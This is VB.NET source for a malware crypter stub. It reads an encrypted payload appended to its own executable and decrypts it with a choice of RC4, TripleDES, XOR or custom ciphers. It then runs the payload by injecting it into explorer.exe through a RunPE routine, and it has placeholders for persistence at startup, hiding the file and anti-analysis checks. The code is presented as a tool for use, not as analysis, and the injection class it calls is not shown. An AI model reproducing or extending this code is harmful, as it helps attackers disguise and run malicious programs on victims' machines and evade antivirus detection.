Imports System.Text
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Security.Cryptography
Imports System.IO
Imports Microsoft.Win32
Public Class Form1
    Const Kokrra = "JHqd2ed9" 'Filesplits
    'creating new instance for the runpe class
    Public Shared Function DES(ByVal b As String, ByVal c As String, ByVal d As Boolean) As String 'TripleDES
        Dim keyArray As Byte()
        Dim toEncryptArray As Byte() = Convert.FromBase64String(b)
        If d Then
            Dim hashmd5 = New MD5CryptoServiceProvider()
            keyArray = hashmd5.ComputeHash(UTF8Encoding.UTF8.GetBytes(c))
        Else
            keyArray = UTF8Encoding.UTF8.GetBytes(c)
        End If
        Dim tdes = New TripleDESCryptoServiceProvider()
        tdes.Key = keyArray
        tdes.Mode = CipherMode.ECB
        tdes.Padding = PaddingMode.PKCS7
        Dim cTransform As ICryptoTransform = tdes.CreateDecryptor()
        Dim resultArray As Byte() = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length)
        Return UTF8Encoding.UTF8.GetString(resultArray)
    End Function
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim getfile As Byte() = [X_x](Application.ExecutablePath) 'read resource
        Dim FileAsString = Encoding.Default.GetString(getfile)
        Dim Info() As String = Split(FileAsString, Kokrra) 'Filesplits
        Dim views As String ' Info(1) 
        Dim custom As String = Info(2) 'custom encryption
        Dim something As String = Info(3) ' custom encryption key
        Dim fstart As String = Info(4) ' add server to startup
        Dim hide1 As String = Info(5) ' hide executable after execution
        Dim ant As String = Info(6) ' antis
        If Info(4) = "True" Then ' If fstart = "True" | add server to startup
            'startup code here
        End If
        If Info(5) = "True" Then 'If hide1 = "True" | hide executable after execution
            'hide file here
        End If
        If Info(6) = "True" Then 'If ant = "True" | antis
            'antis here
        End If
        If custom = "Proto" Then 'If Custom(RadioButton1) = "XOR" | Xor Encryption | Else | RadiButton2(TripleDES Encryption) |
            views = Encoding.Default.GetString(decrypt(Encoding.Default.GetBytes(Info(1)), something))
        ElseIf custom = "RC4" Then
            views = Encoding.Default.GetString(RC4(Encoding.Default.GetBytes(Info(1)), Encoding.Default.GetBytes(something)))
        ElseIf custom = "TripleDES" Then
            views = DES(Info(1), something, True)
        ElseIf custom = "XOR" Then
            views = DXOR(Info(1), something, 8)
        Else
            views = PolyMorphicStairs.PolyDeCrypt(Info(1), something, 8)
        End If
        Dim afile As Byte() = Encoding.GetEncoding(1252).GetBytes(views)
        Try
            psrun.runexe(afile, ":\Windows\System32\explorer.exe")
        Catch ex As Exception
        End Try
        End
    End Sub
   Private Function DXOR(ByVal input As String, ByVal key As String, ByVal amount As Integer) As String 'XOR Encryption
        Dim b1, b2 As Byte()
        b1 = System.Text.Encoding.Default.GetBytes(input)
        b2 = System.Text.Encoding.Default.GetBytes(key)
        For i = 0 To b1.Length - 1
            b1(i) = b1(i) Xor (b2(i Mod b2.Length) << (i + amount + b2.Length)) And 255
        Next
        Return System.Text.Encoding.Default.GetString(b1)
    End Function
    Private Shared Function RC4(ByVal Input As Byte(), ByVal Key As Byte()) As Byte() 'RC4 Encryption
        Dim i, j, swap As UInteger
        Dim s As UInteger() = New UInteger(255) {}
        Dim Output As Byte() = New Byte(Input.Length - 1) {}
        For i = 0 To 255
            s(i) = i
        Next
        For i = 0 To 255
            j = (j + Key(i Mod Key.Length) + s(i)) And 255
            swap = s(i) 'Swapping of s(i) and s(j)
            s(i) = s(j)
            s(j) = swap
        Next
        i = 0 : j = 0
        For c = 0 To Output.Length - 1
            i = (i + 1) And 255
            j = (j + s(i)) And 255
            swap = s(i) 'Swapping of s(i) and s(j)
            s(i) = s(j)
            s(j) = swap
            Output(c) = Input(c) Xor s((s(i) + s(j)) And 255)
        Next
        Return Output
    End Function

    Class os 'Checking for 64bit
        Public Shared Function is64Bit() As Boolean
            If Not System.Environment.GetEnvironmentVariable("x86") = "" Then
                Return True
            Else
                Return False
            End If
        End Function
    End Class
    Public Sub Reflect(ByVal Bytes As Byte()) 'Reflection(For .Net Files)
        Dim Assembly As Reflection.Assembly = Assembly.Load(Bytes)
        Dim entryPoint As MethodInfo = [Assembly].EntryPoint
        Dim objectValue As Object = RuntimeHelpers.GetObjectValue([Assembly].CreateInstance(entryPoint.Name))
        entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), New Object() {New String() {"1"}})
    End Sub
    Function decrypt(ByVal message As Byte(), ByVal password As String) As Byte() 'Proto Encryptions
        Dim passarr As Byte() = System.Text.Encoding.Default.GetBytes(password)
        Dim rand1 As Integer = message(message.Length - 1) Xor 112
        Dim outarr(message.Length) As Byte
        Dim u1 As Integer
        For i1 As Integer = 0 To message.Length - 1
            outarr(i1) = (message(i1) Xor rand1) Xor passarr(u1)
            If u1 = password.Length - 1 Then u1 = 0 Else u1 = u1 + 1
        Next
        ReDim Preserve outarr(message.Length - 2)
        Return outarr
    End Function
End Class

Public Class PolyMorphicStairs 'PolyStairs Encryption
    Overloads Shared Function PolyCrypt(ByVal Data As String, ByVal Key As String, Optional ByVal ExtraRounds As UInteger = 0) As String
        Dim buff() As Byte = PolyCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(Key), ExtraRounds)
        PolyCrypt = Encoding.Default.GetString(buff)
        Erase buff
    End Function
    Overloads Shared Function PolyDeCrypt(ByVal Data As String, ByVal Key As String, Optional ByVal ExtraRounds As UInteger = 0) As String
        Dim buff() As Byte = PolyDeCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(Key), ExtraRounds)
        PolyDeCrypt = Encoding.Default.GetString(buff)
        Erase buff
    End Function
    Overloads Shared Function PolyCrypt(ByRef Data() As Byte, ByVal Key() As Byte, Optional ByVal ExtraRounds As UInteger = 0) As Byte()
        Array.Resize(Data, Data.Length + 1)
        Data(Data.Length - 1) = Convert.ToByte(New Random().Next(1, 255))
        For i = (Data.Length - 1) * (ExtraRounds + 1) To 0 Step -1
            Data(i Mod Data.Length) = CByte(CInt((Data(i Mod Data.Length)) + CInt(Data((i + 1) Mod Data.Length))) Mod 256) Xor Key(i Mod Key.Length)
        Next
        Return Data
    End Function
    Overloads Shared Function PolyDeCrypt(ByRef Data() As Byte, ByVal Key() As Byte, Optional ByVal ExtraRounds As UInteger = 0) As Byte()
        For i = 0 To (Data.Length - 1) * (ExtraRounds + 1)
            Data(i Mod Data.Length) = CByte((CInt(Data(i Mod Data.Length) Xor Key(i Mod Key.Length)) - CInt(Data((i + 1) Mod Data.Length)) + 256) Mod 256)
        Next
        Array.Resize(Data, Data.Length - 1)
        Return Data
    End Function
End Class
